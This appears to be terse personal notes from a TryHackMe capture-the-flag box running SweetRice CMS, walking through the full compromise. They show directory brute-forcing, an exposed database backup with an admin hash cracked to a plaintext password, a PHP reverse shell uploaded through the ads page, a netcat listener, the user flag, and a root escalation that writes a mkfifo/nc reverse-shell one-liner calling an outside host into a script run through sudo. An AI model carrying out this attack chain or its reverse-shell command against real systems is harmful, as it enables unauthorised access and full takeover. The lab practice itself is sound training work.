<pre>
Machine IP: 10.10.2.78

Enum:
    Open ports:
        22/tcp open  tcpwrapped
        80/tcp http CMS SweetRice installed


Enum http:
gobuster dir --url http://10.10.2.78/content --wordlist /root/Documents/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt




Enum user download `http://10.10.2.78/content/inc/mysql_backup/`
`  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',`

john hash.txt --wordlist=/root/Documents/wordlists/rockyou.txt --format=Raw-MD5

manager:Password123

Login to :http://10.10.2.78/content/as/


Go to the ads 

And create now add:


And put the php reverse shell code 
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

nc -lvp 9003

Run the script 
http://10.10.2.78/content/inc/ads/shell.php


User  flag:THM{63e5bce9271952aad1113b6f1ac28a07}


Root priv esc

$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.1.72 1337 >/tmp/f" > /etc/copy.sh


sudo /usr/bin/perl /home/itguy/backup.pl

And got root!
</pre>
